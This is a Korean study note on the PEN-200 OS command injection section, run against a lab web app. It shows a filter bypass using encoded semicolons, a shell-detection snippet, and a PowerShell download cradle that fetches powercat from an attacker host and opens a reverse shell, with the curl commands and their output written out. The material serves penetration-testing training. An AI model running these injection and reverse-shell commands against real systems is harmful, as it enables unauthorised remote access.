# 9.4.1 OS 명령어 인젝션

> **OS Command Injection** · PEN-200 §9.4.1

웹 애플리케이션은 파일 업로드 처리처럼 **하부 운영체제와 상호작용해야 할 때**가 있음. 안전한 구현은 준비된 명령(prepared commands)을 쓰는 전용 API·기능을 제공하는 것임 — 사용자 입력이 명령 자체를 바꿀 수 없는 함수 집합을 시스템 쪽에 노출하는 방식임.

그러나 그런 API 는 설계·개발에 시간이 많이 들고, 처리해야 할 경우의 수가 많으면 미리 정해둔 함수 집합이 너무 경직됨. 그래서 개발자는 **사용자 입력을 그대로 받아 뒤에서 걸러내는** 방식으로 기울고 — 애플리케이션 동작을 바꿀 만한 명령 시퀀스를 필터링하는 식 — 바로 그 지점에서 인젝션이 생김.

대상은 MOUNTAIN 시스템의 8000 포트에서 도는 "Mountain Vaults"(`http://192.168.50.189:8000`).

![[PEN200-Fig-146.png]]

*`git clone` 명령과 URL 을 그대로 받는 입력창*

이 버전은 `git clone` 명령에 URL 을 붙여 입력하면 저장소를 복제해 줌. 안내 예시가 **명령줄에서 치던 것과 동일한 문자열**이라, OS 가 이 문자열을 실행할 것이고 따라서 자기 명령을 끼워 넣을 수 있다는 가설이 섬. ExploitDB 저장소로 시험해 보면 복제가 진행되고, **실행된 실제 명령이 응답에 그대로 표시됨**(랩 환경에서는 복제 자체가 오류로 끝나지만 진행에는 지장 없음).

임의 명령을 넣어 보려면 요청 구조부터 알아야 하므로 Burp 의 HTTP history 로 POST 요청을 확인함.

![[PEN200-Fig-149.png]]

*명령이 실리는 파라미터는 `Archive`*

파라미터 이름이 `Archive` 임을 알았으므로 이후는 curl 로 직접 보냄 — `-X` 로 요청 유형을 POST 로 바꾸고 `--data` 로 본문을 지정함.

```
kali@kali:~$ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
Command Injection detected. Aborting...%!(EXTRA string=ipconfig)
```

*`ipconfig` 단독 입력은 인젝션 탐지에 걸림*

필터가 있음이 확인됐으므로, **통하는 입력에서 거꾸로 되짚어** 우회를 찾음. 먼저 `git` 만 넘겨 봄.

```
kali@kali:~$ curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C
<path>] [-c <name>=<value>]
           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
...
   push      Update remote refs along with associated objects
'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
```

*`git` 단독으로도 실행됨 — `git clone` 에 한정되지 않음*

도움말이 출력된다는 것은 `git clone` 형태에만 묶여 있지 않다는 뜻임. 다음으로 `version` 서브커맨드를 붙임. 통하면 임의의 git 명령을 지정할 수 있다는 것이 확정되고, **동시에 OS 도 판별됨** — Git for Windows 의 버전 문자열에는 "windows" 가 들어가고 Linux 면 순수 버전만 나옴.

```
kali@kali:~$ curl -X POST --data 'Archive=git version'
http://192.168.50.189:8000/archive
Repository successfully cloned with command: git version and output: git version
2.35.1.windows.2
```

Windows 로 확인됨. 다른 명령을 단독으로는 못 쓰므로, 명령 구분자로 `git` 뒤에 자기 명령을 이어 붙임. **세미콜론(URL 인코딩 시 `%3B`)** 은 PowerShell·Bash 등 대부분의 명령줄에서 여러 명령을 구분함. 앰퍼샌드 두 개(`&&`)도 쓸 수 있고, Windows CMD 에서는 하나(`&`)로도 됨.

```
kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig'
http://192.168.50.189:8000/archive
...
'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
Windows IP Configuration
Ethernet adapter Ethernet0 2:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.50.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
```

*인코딩한 세미콜론으로 `git` 과 `ipconfig` 를 연달아 실행*

둘 다 실행됨 — 필터는 `Archive` 값에 `git` 이 실행되는지(혹은 포함되는지) 정도만 보는 것으로 추정됨.

다음은 **주입한 명령이 어느 셸에서 실행되는지** 확인. PetSerAl 이 공개한 아래 스니펫이 실행 위치에 따라 "CMD" 또는 "PowerShell" 을 출력함.

```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

URL 인코딩해 전송함.

```
kali@kali:~$ curl -X POST --data
'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20P
owerShell' http://192.168.50.189:8000/archive
...
See 'git help git' for an overview of the system.
PowerShell
```

*출력이 `PowerShell` — 주입 명령은 PowerShell 환경에서 실행됨*

이제 시스템 접근으로 연결함. 도구는 Powercat — Kali 에 포함된 **Netcat 의 PowerShell 구현**임. `powercat.ps1` 을 kali 사용자 홈으로 복사하고 같은 디렉터리에서 python3 웹 서버를 띄움.

```
kali@kali:~$ cp /usr/share/powershell-
empire/empire/server/data/module_source/management/powercat.ps1 .
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

또 다른 터미널에 4444 포트로 Netcat 리스너를 올려 리버스셸을 받을 준비를 함.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

*4444 포트 Netcat 리스너 대기*

웹 서버와 리스너가 준비된 상태에서 세미콜론으로 이어진 두 부분짜리 명령을 주입함 — 앞부분은 PowerShell 다운로드 크래들로 웹 서버에서 `powercat.ps1` 안의 `powercat` 함수를 불러오고, 뒷부분은 그 함수로 리버스셸을 만듦(`-c` 접속 대상, `-p` 포트, `-e` 실행할 프로그램).

```
IEX (New-Object
System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c
192.168.119.3 -p 4444 -e powershell
```

전체를 다시 URL 인코딩해 보냄.

```
kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-
Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat
.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell'
http://192.168.50.189:8000/archive
```

웹 서버 쪽에는 `powercat.ps1` 에 대한 GET 요청이 찍히고, 리스너에는 `C:\Users\Administrator\Documents\meteor` 에서 시작하는 PowerShell 셸이 붙음.

```
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.50.189 - - [05/Apr/2022 09:05:48] "GET /powercat.ps1 HTTP/1.1" 200 -
```

*웹 서버 로그에 `powercat.ps1` GET 요청이 찍힘*

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Users\Administrator\Documents\meteor>
```

*리스너에 PowerShell 셸 연결 — `Documents\meteor` 에서 시작*

Powercat 대신 PowerShell 리버스셸을 직접 주입해도 됨. 명령어 인젝션의 악용 방법은 **하부 운영체제·애플리케이션 구현·적용된 보안 장치에 따라 크게 달라짐**.
